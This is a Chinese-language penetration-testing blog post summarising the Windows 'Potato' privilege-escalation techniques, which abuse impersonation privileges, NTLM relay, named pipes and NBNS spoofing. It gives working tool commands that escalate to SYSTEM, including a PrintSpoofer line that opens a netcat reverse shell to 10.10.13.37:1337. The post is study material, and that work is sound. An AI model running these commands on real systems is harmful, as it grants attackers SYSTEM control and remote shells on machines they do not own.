---
title: Potato家族提权
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-31T21:35:46+08:00
categories: 
- 渗透测试
- 内网体系建设
---

# Potato家族提权总结

potota家族提权，本质是通过操纵访问令牌，将账户服务提权到SYSTEM权限

利用 Potato 提权（除开 Hot Potato）的是前提是拥有 **SeImpersonatePrivilege** 或 **SeAssignPrimaryTokenPrivilege** 权限，以下用户拥有 **SeImpersonatePrivilege** 权限（而只有更高权限的账户比如 SYSTEM 才有 SeAssignPrimaryTokenPrivilege 权限）：

- 本地管理员账户(不包括管理员组普通账户)和本地服务账户
- 由 SCM 启动的服务

这两个权限允许用户在另一个用户的安全上下文中运行代码，甚至创建进程，所以通常是administrator提权到SYSTEM

## Rotten Potato

烂土豆，实现机制通过NTLM拦截身份认证请求，并伪造NT AUTHORITY\SYSTEM账户的访问令牌。

**NTML**

NTLM（Windows NT LAN Manager）是一种用于身份验证和安全通信的协议，常用于Windows操作系统中的网络通信。NTLM拦截是一种攻击技术，攻击者通过拦截和篡改NTLM身份验证流量来获取用户凭据。NTML认证可以被重放

大致流程如下:

1.通过GoGetInstanceFromIStorage API 将一个COM对象(BITS)加载到本地可控的端口，诱骗BITS对象以NT AUTHROITY\SYSTEM账户的身份向端口发起NTML认证

2. 借助本地RPC端口，对BITS对象的认证过程执行中间人攻击，调用相关API为NT AUTHROITY\SYSTEM账户在本地生成一个访问令牌
3. 通过该令牌创建新进程，获取SYSTEM权限

当获取到shell之后，可通过whoami /priv命令来查看当前账户获得的权限

![1](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/1.png)

当我们获取到目标的shell之后，上传利用脚本,执行该脚本

```
excute -Hc -f rottenpotato.exe
```

随即就能通过list_tokens -u看到SYSTEM用户的令牌

![2](https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/2.png)

之后通过impersonate_token伪造令牌操作，即可以SYSTEM用户上线

https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

## Juicy Potato

原理与rottenpotato几乎相同，但是操作更加灵活，可以不采用默认端口，可以自定义COM对象，可以多版本服务了，具体的COM对象请参照

https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

根据目标的系统版本自行选择CLSID

```
JuicyPotato.exe -t t -p  C:\...\...\reverse_tcp.exe -l 6666 -n 135 -c  {CLSID}
```

对几个参数简单介绍

```
-t 指定要使用CreateProcessWithTokenW和CreateProcessAsUserA()中的那个函数创建进程
-p,指定要运行的进程
-l 指定COM对象加载的端口
-n 指定本地RPC服务端口，默认为135
-c 指定加载COM对象的CLSID
```

UknowSec修改后的JuicyPotato.exe,可直接在webshell环境中使用

```
.\JuicyPotato.exe_x64.exe -a whoami
```

## PrintSpoofer(Pipe Potato)

通过 Windows named pipe 的一个 API: `ImpersonateNamedPipeClient`来模拟高权限客户端的 token（还有类似的`ImpersonatedLoggedOnUser`，`RpcImpersonateClient`函数）利用打印机组件中存在的BUG，使高权限的服务能连接到测试人员创建的命名管道，以获取高权限用户的令牌来创建新进程

spoolsv.exe中有一个公开的RPC服务，内置函数pszLocalMachine，该函数需要传递参数例如\\\127.0.0.1

此时服务器访问\\127.0.0.1\pipe\spoolss,当传递\\\127.0.0.1/pipe/foo时，会将这一整串认为是主机名，会连接主机名加后缀的管道，从而攻击者获取刀token

**利用**

博文：https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

工具：https://github.com/itm4n/PrintSpoofer

直接获取一个SYSTEMshell 

```shell
C:\TOOLS>PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19613.1000]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

或是获得一个反向shell

```
PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
```

## Rogue Potato

同样是利用管道操作，利用的技巧也和Pipe Popato的技术相同，高版本 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。为了绕过这个限制并能做本地令牌协商，作者在一台远程主机上的 135 端口做流量转发，将其转回受害者本机端口，并写了一个恶意 RPC OXID 解析器。

工具地址：https://github.com/antonioCoco/RoguePotato

博文：https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/

事实上，在旧的 *potato 漏洞利用中，窃取令牌的另一种方法是在专用端口上设置本地 RPC 侦听器，而不是伪造本地 NTLM 身份验证，RpcImpersonateClient（） 将完成剩下的工作。

## Hot Potato

利用 Windows 中的已知问题在默认配置（即 NTLM 中继（特别是 HTTP->SMB 中继）和 NBNS 欺骗）中获取本地权限提升。这种技术，我们可以将Windows工作站上的权限从最低级别提升到“NT AUTHORITY\SYSTEM”

### NBNS欺骗

NBNS 是一种广播 UDP 协议，用于 Windows 环境中常用的名称解析。当您（或Windows）执行DNS查找时，Windows首先将检查“主机”文件。如果不存在条目，它将尝试 DNS 查找。如果此操作失败，将执行 NBNS 查找。NBNS协议基本上只是询问本地广播域上的所有主机“谁知道主机XXX的IP地址？网络上的任何主机都可以自由响应。谁响应了该问题，谁就是XXX。攻击者往往监听广播消息，并应答自己是XXX

利用虚假响应，并用 NBNS 响应快速淹没目标主机（因为它是 UDP 协议）。一个复杂的问题是，NBNS 数据包中的 2 字节字段 TXID 必须在请求和响应中匹配，我们无法看到请求。我们可以通过快速泛洪并迭代所有 65536 个可能的值来克服

如果目标网络有我们要欺骗的目标主机的DNS记录，我们可以通过UDP端口耗尽的技术来强制系统上的所有DNS查找失败，从而使用NBNS

### Fake WPAD代理服务器

在Windows中，默认情况下，系统会访问`http://wpad/wpad.dat`来检测网络代理设置配置，借助欺骗 NBNS 响应的功能，我们可以将 NBNS 欺骗程序定位在 127.0.0.1。同时在127.0.0.1上构建http，将所有的WPAD流量都引导到本地

### HTTP ->SMB NTML Relay

HTTP->SMB 等跨协议攻击仍然可以工作,当有问题的 HTTP 请求源自高特权帐户时，例如，当它是来自 Windows Update 服务的请求时，此命令将以“NT AUTHORITY\SYSTEM”权限运行

### 利用

https://foxglovesecurity.com/2016/01/16/hot-potato/

工具地址：https://github.com/foxglovesec/Potato，https://github.com/Kevin-Robertson/Tater

影响版本:

win7,win10,win8,win server 2008,2012

## Sweet  Potato

COM/WinRM/Spoolsv的集合版，也就是Juicy/PrintSpoofer‘

工具地址：https://github.com/lengjibo/RedTeamTools/tree/master/windows/SweetPotato，https://github.com/CCob/SweetPotato/tree/master

## 参考链接

https://xz.aliyun.com/t/7776/#toc-7

https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/#6-sweetpotato
